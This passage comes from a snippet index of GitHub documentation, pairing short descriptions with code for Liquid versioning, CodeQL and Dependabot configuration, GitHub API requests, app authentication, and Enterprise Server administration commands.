html\nCODE:\n```\n{% ifversion push-protection-bypass-fine-grained-permissions %}\n```\n\nLANGUAGE: html\nCODE:\n```\n{% endif %}\n```\n\nLANGUAGE: html\nCODE:\n```\n{% ifversion security-delegated-alert-dismissal %}\n```\n\nLANGUAGE: html\nCODE:\n```\n{% ifversion ghes %}\n```\n\nLANGUAGE: html\nCODE:\n```\n{% ifversion projects-v1 %}\n```\n\nLANGUAGE: html\nCODE:\n```\n{% ifversion team-discussions %}\n```\n\n----------------------------------------\n\nTITLE: Configuring qlpack.yml for publishing\nDESCRIPTION: This snippet shows the structure and key configurations inside a qlpack.yml file prior to publishing a CodeQL pack. The configuration includes details such as the name, version, description, default suite and dependencies of the pack. It highlights how the 'name' field follows the '<scope>/<pack>' format.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\nlibrary: # set to true if the pack is a library. Set to false or omit for a query pack\nname: <scope>/<pack>\nversion: <x.x.x>\ndescription: <Description to publish with the package>\ndefaultSuite: # optional, one or more queries in the pack to run by default\n    - query: <relative-path>/query-file>.ql\ndefaultSuiteFile: default-queries.qls # optional, a pointer to a query-suite in this pack\nlicense: # optional, the license under which the pack is published\ndependencies: # map from CodeQL pack name to version range\n```\n\n----------------------------------------\n\nTITLE: Creating Fenced Code Blocks with Backticks in Text\nDESCRIPTION: Demonstrates how to create fenced code blocks using triple backticks in Markdown. The example showcases the structure needed to define a code block with a blank line before and after the code itself. This is important for readability in raw Markdown.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/creating-and-highlighting-code-blocks.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n```\nfunction test() {\n  console.log(\"notice the blank line before this function?\");\n}\n```\n```\n\n----------------------------------------\n\nTITLE: Conditional Linking to Different Docs Version\nDESCRIPTION: This snippet demonstrates how to conditionally create a link to the same article in a different product version (GitHub Enterprise Cloud) based on the current version (fpt - Free, Pro, Team). It uses Liquid-style templating to check the version and generate the appropriate link. The `currentArticle` variable ensures the link remains valid even if the article URL changes.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_27\n\nLANGUAGE: markdown\nCODE:\n```\n{% raw %}{% ifversion fpt %}For more information, see the [{% data variables.product.prodname_ghe_cloud %} documentation](/enterprise-cloud@latest{{ currentArticle }}).{% endif %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Enabling PROXY Protocol on GitHub Enterprise Server (Shell)\nDESCRIPTION: This code snippet demonstrates how to enable PROXY protocol support on a GitHub Enterprise Server instance. It uses the `ghe-config` command to set the `loadbalancer.proxy-protocol` configuration option to `true`, followed by `ghe-cluster-config-apply` to apply the configuration changes across the cluster. This configuration allows the instance to receive and process client IP addresses from the load balancer when using the PROXY protocol.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/cluster-network-configuration.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-config 'loadbalancer.proxy-protocol' 'true' && ghe-cluster-config-apply\n```\n\n----------------------------------------\n\nTITLE: Making GitHub API Request with User Access Token\nDESCRIPTION: This shell command demonstrates how to make a GET request to the GitHub API's `/user` endpoint using a user access token. The token is included in the `Authorization` header with the `Bearer` scheme. The `Accept` and `X-GitHub-Api-Version` headers are also included for proper API versioning and content negotiation. Replace `USER_ACCESS_TOKEN` with the actual token value.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/apps/user-access-token-example-request.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncurl --request GET \\\n--url \"{% data variables.product.rest_url %}/user\" \\\n--header \"Accept: application/vnd.github+json\" \\\n--header \"Authorization: Bearer USER_ACCESS_TOKEN\" \\\n--header \"X-GitHub-Api-Version: {{ allVersions[currentVersion].latestApiVersion }}\"\n```\n\n----------------------------------------\n\nTITLE: Checking OAuth scopes\nDESCRIPTION: This Ruby snippet extends the '/callback' route to check if the requested 'user:email' scope was granted. It parses the 'scope' parameter from the GitHub response, splits it into an array of scopes, and checks if the array includes 'user:email' or 'user' scope. The check is needed to verify what information from the user is available.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authenticating-to-the-rest-api-with-an-oauth-app.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nget '/callback' do\n  # ...\n  # Get the access_token using the code sample above\n  # ...\n\n  # check if we were granted user:email scope\n  scopes = JSON.parse(result)['scope'].split(',')\n  has_user_email_scope = scopes.include? 'user:email' || scopes.include? 'user'\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Installation Access Token\nDESCRIPTION: This code snippet demonstrates how to generate an installation access token using a `POST` request to the GitHub API. The token is used to authenticate as a {% data variables.product.prodname_github_app %} installation and perform actions such as approving or rejecting deployments. The request requires a JSON Web Token (JWT) for initial authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-deployments/creating-custom-deployment-protection-rules.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request POST \\\n--url \"{% data variables.product.rest_url %}/app/installations/INSTALLATION_ID/ACCESS_TOKENS\" \\\n--header \"Accept: application/vnd.github+json\" \\\n--header \"Authorization: Bearer {jwt}\" \\\n--header \"Content-Type: application/json\" \\\n--data \\\n'{ \\\n   \"repository_ids\": [321], \\\n   \"permissions\": { \\\n      \"deployments\": \"write\" \\\n   } \\\n}'\n```\n\n----------------------------------------\n\nTITLE: Workflow Dispatch Inputs Configuration\nDESCRIPTION: Defines input parameters for a GitHub Actions workflow dispatch, including log level (choice), print_tags (boolean), tags (string), and environment. Each input specifies a description, whether it's required, a default value (if applicable), a data type, and options (for choice types).\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflow-dispatch-inputs-example.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  workflow_dispatch:\n    inputs:\n      logLevel:\n        description: 'Log level'\n        required: true\n        default: 'warning'\n        type: choice\n        options:\n          - info\n          - warning\n          - debug\n      print_tags:\n        description: 'True to print to STDOUT'\n        required: true\n        type: boolean\n      tags:\n        description: 'Test scenario tags'\n        required: true\n        type: string\n      environment:\n        description: 'Environment to run tests against'\n        type: environment\n        required: true\n```\n\n----------------------------------------\n\nTITLE: Disabling Default Queries and Specifying Custom Queries in CodeQL\nDESCRIPTION: This configuration disables the default queries and specifies a set of custom queries to run. It also configures CodeQL to scan files in the _src_ directory, excluding the _src/node_modules_ directory and files ending in _.test.js_.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/code-scanning/example-configuration-files.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nname: \"My {% data variables.product.prodname_codeql %} config\"\n\ndisable-default-queries: true\n\nqueries:\n  - name: Use an in-repository {% data variables.product.prodname_codeql %} pack (run queries in the my-queries directory)\n    uses: ./my-queries\n  - name: Use an external JavaScript {% data variables.product.prodname_codeql %} pack (run queries from an external repo)\n    uses: octo-org/javascript-codeql-pack@main\n  - name: Use an external query (run a single query from an external {% data variables.product.prodname_codeql %} pack)\n    uses: octo-org/python-codeql-pack/show_ifs.ql@main\n  - name: Use a query suite file (run queries from a query suite in this repo)\n    uses: ./codeql-packs/complex-python-codeql-pack/rootAndBar.qls\n\npaths:\n  - src\npaths-ignore:\n  - src/node_modules\n  - '**/*.test.js'\n```\n\n----------------------------------------\n\nTITLE: Setting Repository Permissions in devcontainer.json (JSON)\nDESCRIPTION: This JSON snippet demonstrates how to configure repository permissions for GitHub Codespaces within the `devcontainer.json` file.  It specifies the repository name (my_org/my_repo) and the specific permissions (issues: write) granted to the codespace. Any custom permissions added or changed will only apply to new codespaces created after the changes have been committed.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/managing-your-codespaces/managing-repository-access-for-your-codespaces.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"customizations\": {\n    \"codespaces\": {\n      \"repositories\": {\n        \"my_org/my_repo\": {\n          \"permissions\": {\n            \"issues\": \"write\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Running dry-run with source file path\nDESCRIPTION: This command performs a dry run migration of a Bamboo build using a specified source file path. The `--source-file-path` argument specifies the path to the Bamboo configuration file.  The `--plan-slug` parameter specifies the Bamboo plan's project and plan key. The `-o` is a shorthand for `--output-dir` to specify output directory for converted workflow files.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_13\n\nLANGUAGE: Shell\nCODE:\n```\ngh actions-importer dry-run bamboo build --plan-slug IN-COM -o tmp/bamboo --source-file-path ./path/to/my/bamboo/file.yml\n```\n\n----------------------------------------\n\nTITLE: Redux Reducer for Counter State\nDESCRIPTION: This code defines a Redux reducer named `counterReducer` that manages the counter state.  It initializes the state with a count of 0 and handles the 'INCREMENT' action. If the count is already 10 or greater, it displays an alert and returns the current state without modifying it. Otherwise, it increments the count and returns the updated state.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/decoupling-business-logic-from-ui-components.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nconst initialState = {\n  count: 0\n};\n\nconst counterReducer = (state = initialState, action) => {\n  switch (action.type) {\n    case 'INCREMENT':\n      if (state.count >= 10) {\n        alert('Count cannot exceed 10');\n        return state;\n      }\n      return {\n        ...state,\n        count: state.count + 1\n      };\n    default:\n      return state;\n  }\n};\n\nexport default counterReducer;\n```\n\n----------------------------------------\n\nTITLE: Configuring ECR access using Authorization Token (Shell)\nDESCRIPTION: This snippet demonstrates how to configure access to AWS Elastic Container Registry (ECR) by providing an authorization token fetched via AWS's APIs or CLI. The *_CONTAINER_REGISTRY_SERVER variable should be set to the ECR URL, *_CONTAINER_REGISTRY_USER should be set to \"AWS\", and *_CONTAINER_REGISTRY_PASSWORD should be set to the authorization token. Tokens are short-lived and need to be refreshed periodically.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/reference/allowing-your-codespace-to-access-a-private-registry.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n*_CONTAINER_REGISTRY_SERVER = <ECR_URL>\n*_CONTAINER_REGISTRY_USER = AWS\n*_CONTAINER_REGISTRY_PASSWORD = <TOKEN>\n```\n\n----------------------------------------\n\nTITLE: Modifying cluster.conf for Node Replacement\nDESCRIPTION: This code snippet shows how to modify the `cluster.conf` file to replace a failed node with a newly provisioned one. It includes the node's hostname, IPv4 address, and server roles. This configuration is crucial for integrating the replacement node into the existing cluster.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_clustering/replacing-a-cluster-node-modify-cluster-conf.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n[cluster \"<em>ghe-replacement-data-node-3</em>\"]\n  hostname = <em>ghe-replacement-data-node-3</em>\n  ipv4 = <em>192.168.0.7</em>\n  # ipv6 = fd12:3456:789a:1::7\n  consul-datacenter = PRIMARY-DATACENTER\n  git-server = true\n  pages-server = true\n  mysql-server = true\n  elasticsearch-server = true\n  redis-server = true\n  memcache-server = true\n  metrics-server = true\n  storage-server = true\n```\n\n----------------------------------------\n\nTITLE: Updating a Custom Text Field using GraphQL with curl\nDESCRIPTION: This snippet demonstrates how to update a custom text, number, or date field for a project item using the GitHub GraphQL API and `curl`. It requires replacing `PROJECT_ID`, `ITEM_ID`, and `FIELD_ID` with the appropriate values. The API key should be provided as a bearer token in the `Authorization` header.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_21\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request POST \\\n  --url https://api.github.com/graphql \\\n  --header 'Authorization: Bearer TOKEN' \\\n  --data '{\"query\":\"mutation {updateProjectV2ItemFieldValue( input: { projectId: \\\"PROJECT_ID\\\" itemId: \\\"ITEM_ID\\\" fieldId: \\\"FIELD_ID\\\" value: { text: \\\"Updated text\\\" }}) { projectV2Item { id }}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Searching models by output modality on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models that support embedding output using the `output-modality` qualifier. The search query filters models based on the specified output modality.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_6\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=output-modality:embeddings&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Start Development Server with Languages\nDESCRIPTION: This command shows how to start the development server with specific languages enabled. Setting the `ENABLED_LANGUAGES` environment variable allows you to test the application with a subset of the available translations.\nSOURCE: https://github.com/github/docs/blob/main/src/languages/README.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\nENABLED_LANGUAGES=en,ja,es NODE_ENV=development nodemon server.js\n```\n\n----------------------------------------\n\nTITLE: Verifying GitHub Actions Importer Installation\nDESCRIPTION: This command verifies that the GitHub Actions Importer CLI extension is installed correctly. It executes the `gh actions-importer -h` command, which displays the help information for the extension, including available commands and options. Successful execution confirms that the extension is installed and accessible via the `gh` tool.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/installing-actions-importer.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ gh actions-importer -h\nOptions:\n  -?, -h, --help  Show help and usage information\n\nCommands:\n  update     Update to the latest version of GitHub Actions Importer.\n  version    Display the version of GitHub Actions Importer.\n  configure  Start an interactive prompt to configure credentials used to authenticate with your CI server(s).\n  audit      Plan your CI/CD migration by analyzing your current CI/CD footprint.\n  forecast   Forecast GitHub Actions usage from historical pipeline utilization.\n  dry-run    Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n  migrate    Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes.\n```\n\n----------------------------------------\n\nTITLE: Authenticating as a GitHub App with JWT\nDESCRIPTION: This Ruby code snippet demonstrates how to authenticate as a GitHub App by creating a JSON Web Token (JWT), signing it with the app's private key, and then using the JWT to initialize an Octokit client. The JWT includes the issue time, expiration time, and the app's identifier. It relies on the `jwt` gem and the `Octokit` library.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\n# Instantiate an Octokit client authenticated as a GitHub App.\n# GitHub App authentication requires that you construct a\n# JWT (https://jwt.io/introduction/) signed with the app's private key,\n# so GitHub can be sure that it came from the app an not altered by\n# a malicious third party.\ndef authenticate_app\n  payload = {\n      # The time that this JWT was issued, _i.e._ now.\n      iat: Time.now.to_i,\n\n      # JWT expiration time (10 minute maximum)\n      exp: Time.now.to_i + (10 * 60),\n\n      # Your GitHub App's identifier number\n      iss: APP_IDENTIFIER\n  }\n\n  # Cryptographically sign the JWT\n  jwt = JWT.encode(payload, PRIVATE_KEY, 'RS256')\n\n  # Create the Octokit client, using the JWT as the auth token.\n  @app_client ||= Octokit::Client.new(bearer_token: jwt)\nend\n```\n\n----------------------------------------\n\nTITLE: Nested Conditional Rendering (GHES > 2.13 and GHES > 2.16) - Liquid\nDESCRIPTION: This snippet demonstrates nested conditional rendering with 'ifversion'. First checks if it's not FPT and GHES is greater than 2.13, renders 'Alpha' and then checks if GHES is greater than 2.16 rendering 'Bravo'. Otherwise, renders 'Charlie'.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/and-greater-than1.md#_snippet_4\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion not fpt and ghes > 2.13 %}\n\nAlpha\n\n{% ifversion ghes > 2.16 %}\n\nBravo\n\n{% endif %}\n\n{% else %}\n\nCharlie\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Configuring Azure DevOps NuGet feed with token in dependabot.yml\nDESCRIPTION: This snippet configures an Azure DevOps NuGet feed in `dependabot.yml` using a token for authentication. The registry URL points to the Azure DevOps feed, and the token is stored as a secret.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_16\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  nuget-azure-devops:\n    type: nuget-feed\n    url: https://pkgs.dev.azure.com/.../_packaging/My_Feed/nuget/v3/index.json\n    token: ${{secrets.MY_AZURE_DEVOPS_TOKEN}}\n```\n\n----------------------------------------\n\nTITLE: Verifying Remote URL in Git\nDESCRIPTION: Verifies the remote URL that has been set for the local Git repository. This command displays the remote name (origin) and its corresponding URL, confirming the correct configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/adding-locally-hosted-code-to-github.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngit remote -v\n```\n\n----------------------------------------\n\nTITLE: Exporting User License Usage (Shell)\nDESCRIPTION: Exports a list of the installation's users in JSON format using the `ghe-license` (or `ghe-license-usage`) utility.  This information is used for reporting licensing information to GitHub Enterprise Cloud.  The command and flags vary based on the GitHub Enterprise Server version.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_107\n\nLANGUAGE: shell\nCODE:\n```\n{% ifversion ghes > 3.12 %}ghe-license usage{% else %}ghe-license-usage{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Generating SSH Certificate with Login Extension\nDESCRIPTION: This command generates an SSH certificate using the `ssh-keygen` utility. It includes an extension specifying the GitHub username associated with the certificate, limiting the certificate's use to that specific user. The certificate will be valid for 1 day.\nSOURCE: https://github.com/github/docs/blob/main/content/organizations/managing-git-access-to-your-organizations-repositories/about-ssh-certificate-authorities.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nssh-keygen -s ./ca-key -V '+1d' -I KEY-IDENTITY -O extension:login@{% data variables.product.product_url %}=USERNAME ./user-key.pub\n```\n\n----------------------------------------\n\nTITLE: Creating a New .NET Console Project\nDESCRIPTION: This command creates a new .NET console application project.  `PROJECT_NAME` should be replaced with the desired name of the project.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-nuget-registry.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ndotnet new console --name PROJECT_NAME\n```\n\n----------------------------------------\n\nTITLE: Generating CSRF Secret using OpenSSL\nDESCRIPTION: This command generates a 32-character hexadecimal string using OpenSSL, which is used as a secret to prevent Cross-Site Request Forgery (CSRF) attacks when enabling interactive maps. The generated string must be stored securely.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-user-applications-for-your-enterprise/configuring-interactive-maps.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nopenssl rand -hex 32\n```\n\n----------------------------------------\n\nTITLE: Renaming a File Using Git\nDESCRIPTION: This command renames a file using the `git mv` command. It is essential to update the filename to match the new title for SEO and maintainability.  The command takes the old filename and the new filename as arguments.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/changing-an-articles-title.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ git mv old-article-name.md new-article-name.md\n```\n\n----------------------------------------\n\nTITLE: Exporting Docker Container to tar.gz Archive\nDESCRIPTION: This shell command exports the specified Docker container to a tar archive and then compresses it using gzip. The resulting debian.tar.gz file can then be uploaded to GitHub Enterprise Server.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-environment.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ndocker export pre-receive.debian | gzip > debian.tar.gz\n```\n\n----------------------------------------\n\nTITLE: Running a Dry Run for Archiving GHES Version (Shell)\nDESCRIPTION: This shell command executes a dry run of the archive-version script, allowing for local testing of the archival process. The `--dry-run` flag prevents actual file overwrites, while `--local-dev` configures the script for a local development environment.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/lib/deprecation-steps.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nnpm run archive-version -- --dry-run --local-dev\n```\n\n----------------------------------------\n\nTITLE: Example Access Token Response - XML\nDESCRIPTION: This code snippet displays an example of an access token response in XML format when the `Accept: application/xml` header is used. It includes the token type, scope, and access token within XML tags. It is useful when an application expects XML formatted responses.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_4\n\nLANGUAGE: XML\nCODE:\n```\n<OAuth>\n  <token_type>bearer</token_type>\n  <scope>repo,gist</scope>\n  <access_token>gho_16C7e42F292c6912E7710c838347Ae178B4a</access_token>\n</OAuth>\n```\n\n----------------------------------------\n\nTITLE: Example Interactive Rebase File - Text\nDESCRIPTION: This is an example of the interactive rebase file that Git opens in a text editor. Each line represents a commit with a command (default `pick`), the commit SHA, and the commit message.  The file includes comments explaining available commands (pick, reword, edit, squash, fixup, exec) and warnings about removing lines.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git-rebase.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\npick 1fc6c95 Patch A\npick 6b2481b Patch B\npick dd1475d something I want to split\npick c619268 A fix for Patch B\npick fa39187 something to add to patch A\npick 4ca2acc i cant' typ goods\npick 7b36971 something to move before patch B\n\n# Rebase 41a72e6..7b36971 onto 41a72e6\n#\n# Commands:\n#  p, pick = use commit\n#  r, reword = use commit, but edit the commit message\n#  e, edit = use commit, but stop for amending\n#  s, squash = use commit, but meld into previous commit\n#  f, fixup = like \"squash\", but discard this commit's log message\n#  x, exec = run command (the rest of the line) using shell\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n# However, if you remove everything, the rebase will be aborted.\n#\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering with Else Branch based on GHES version\nDESCRIPTION: This snippet uses the `ifversion` tag with an `else` branch to render \"Alpha\" if the GHES version is greater than 2.13 and less than 2.16, and \"Bravo\" otherwise. This provides a fallback option for versions outside the specified range.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/and-greater-than2.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes > 2.13 and ghes < 2.16 %}\n\nAlpha\n\n{% else %}\n\nBravo\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Launching GitHub Desktop on Windows\nDESCRIPTION: Launches GitHub Desktop on Windows, opening the repository located at the specified path. The first command launches GitHub Desktop with the specified repository path. The second example changes the current directory to the repository and then launches GitHub Desktop.\nSOURCE: https://github.com/github/docs/blob/main/content/desktop/overview/launching-github-desktop-from-the-command-line.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nC:\\Users\\octocat> github PATH\\TO\\REPO\n```\n\nLANGUAGE: shell\nCODE:\n```\nC:\\Users\\octocat> cd REPO\\MY-REPO\nC:\\Users\\octocat\\repo\\myrepo> github .\n```\n\n----------------------------------------\n\nTITLE: CODEOWNERS File Example\nDESCRIPTION: This example demonstrates the syntax and usage of a CODEOWNERS file, showcasing comments, file patterns, user and team assignments, and email address usage for code ownership.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n# This is a comment.\n# Each line is a file pattern followed by one or more owners.\n\n# These owners will be the default owners for everything in\n# the repo. Unless a later match takes precedence,\n# @global-owner1 and @global-owner2 will be requested for\n# review when someone opens a pull request.\n*       @global-owner1 @global-owner2\n\n# Order is important; the last matching pattern takes the most\n# precedence. When someone opens a pull request that only\n# modifies JS files, only @js-owner and not the global\n# owner(s) will be requested for a review.\n*.js    @js-owner #This is an inline comment.\n\n# You can also use email addresses if you prefer. They'll be\n# used to look up users just like we do for commit author\n# emails.\n*.go docs@example.com\n\n# Teams can be specified as code owners as well. Teams should\n# be identified in the format @org/team-name. Teams must have\n# explicit write access to the repository. In this example,\n# the octocats team in the octo-org organization owns all .txt files.\n*.txt @octo-org/octocats\n\n# In this example, @doctocat owns any files in the build/logs\n# directory at the root of the repository and any of its\n# subdirectories.\n/build/logs/ @doctocat\n\n# The `docs/*` pattern will match files like\n# `docs/getting-started.md` but not further nested files like\n# `docs/build-app/troubleshooting.md`.\ndocs/* docs@example.com\n\n# In this example, @octocat owns any file in an apps directory\n# anywhere in your repository.\napps/ @octocat\n\n# In this example, @doctocat owns any file in the `/docs`\n# directory in the root of your repository and any of its\n# subdirectories.\n/docs/ @doctocat\n\n# In this example, any change inside the `/scripts` directory\n# will require approval from @doctocat or @octocat.\n/scripts/ @doctocat @octocat\n\n# In this example, @octocat owns any file in a `/logs` directory such as\n# `/build/logs`, `/scripts/logs`, and `/deeply/nested/logs`. Any changes\n```\n\n----------------------------------------\n\nTITLE: Aligning Table Content with Markdown\nDESCRIPTION: This code snippet shows how to align table columns using Markdown syntax. Colons (`:`) are used to specify left, right, or center alignment within the table header row.  The example demonstrates a table with options, requirements, security updates, version updates, and descriptions.  Standard Markdown syntax is used for content. The raw octicon directives are included in the table cells.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_34\n\nLANGUAGE: text\nCODE:\n```\n| Option              | Required | Security Updates | Version Updates | Description                    |\n|---------------------|:--------:|:----------------:|:---------------:|--------------------------------|\n| `package-ecosystem` |{% raw %}{% octicon \"check\" aria-label=\"Supported\" %}|{% octicon \"x\" aria-label=\"Not supported\" %}|{% octicon \"check\" aria-label=\"Supported\" %}{% endraw %}| Package manager to use         |\n| `directory`         |{% raw %}{% octicon \"check\" aria-label=\"Supported\" %}|{% octicon \"x\" aria-label=\"Not supported\" %}|{% octicon \"check\" aria-label=\"Supported\" %}{% endraw %}| Location of package manifests  |\n| `schedule.interval` |{% raw %}{% octicon \"check\" aria-label=\"Supported\" %}|{% octicon \"x\" aria-label=\"Not supported\" %}|{% octicon \"check\" aria-label=\"Supported\" %}{% endraw %}| How often to check for updates |\n```\n\n----------------------------------------\n\nTITLE: Upgrading GitHub Enterprise Server (Legacy)\nDESCRIPTION: This command installs the {% data variables.product.prodname_ghe_server %} software on the newly partitioned disk using a legacy partition table.  `PACKAGE-NAME.pkg` must be replaced with the path to the upgrade package. The `-s` and `-t` options specify the installation to a new disk and the target device.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/updating-the-virtual-machine-and-physical-resources/increasing-storage-capacity.md#_snippet_10\n\nLANGUAGE: Shell\nCODE:\n```\nghe-upgrade PACKAGE-NAME.pkg -s -t /dev/xvdg1\n```\n\n----------------------------------------\n\nTITLE: Refactoring with Module Pattern in JavaScript\nDESCRIPTION: This JavaScript code refactors the original code using the Module pattern. It encapsulates the `Person` class, the `people` object, and the related functions within a module to avoid polluting the global namespace. This improves code organization and data privacy.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/refactoring-to-implement-a-design-pattern.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst PersonModule = (function() {\n  class Person {\n    constructor(name, age) {\n      this.name = name;\n      this.age = age;\n    }\n  }\n\n  const people = {};\n\n  function addPerson(name, age) {\n    people[name] = new Person(name, age);\n  }\n\n  function getAge(name) {\n    if (people[name]) {\n      console.log(name + \" is \" + people[name].age + \" years old.\");\n    } else {\n      console.log(\"Person not found.\");\n    }\n  }\n\n  return {\n    addPerson,\n    getAge\n  };\n})();\n\nPersonModule.addPerson(\"Ana\", 30);\nPersonModule.addPerson(\"Mario\", 25);\nPersonModule.addPerson(\"Louise\", 40);\n\nPersonModule.getAge(\"Mario\");\n```\n\n----------------------------------------\n\nTITLE: Checkout Publication Branch (Shell)\nDESCRIPTION: Checks out the topic branch for the GHES release candidate (RC) in the local clone of `github/docs-internal`. Replace `NAME-OF-PUBLICATION-BRANCH` with the name of the target branch, like `ghes-3.13-rc`.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/lib/release-templates/release-steps-5.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngit checkout NAME-OF-PUBLICATION-BRANCH\n```\n\n----------------------------------------\n\nTITLE: Making a Request with the `request` Method in Ruby\nDESCRIPTION: This example shows how to make a GET request to the `/repos/{owner}/{repo}/issues` endpoint using the `request` method. It passes parameters as a hash.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\noctokit.request(\"GET /repos/{owner}/{repo}/issues\", owner: \"github\", repo: \"docs\", per_page: 2)\n```\n\n----------------------------------------\n\nTITLE: Re-mapping Migration Data with ghe-migrator\nDESCRIPTION: This command re-maps migration data using the `ghe-migrator map` command. It requires the path to the modified _.csv_ file and the Migration GUID. This is used to apply conflict resolutions.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/migrating-data-to-github-enterprise-server.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nghe-migrator map -i conflicts.csv -g MIGRATION-GUID\n```\n\n----------------------------------------\n\nTITLE: Initializing Readline Interface for User Input in Node.js\nDESCRIPTION: This snippet initializes the readline interface to handle user input from the console. It sets up the input stream to `process.stdin` and the output stream to `process.stdout`. The readline interface is then used to prompt the user for menu options and account operations.\nSOURCE: 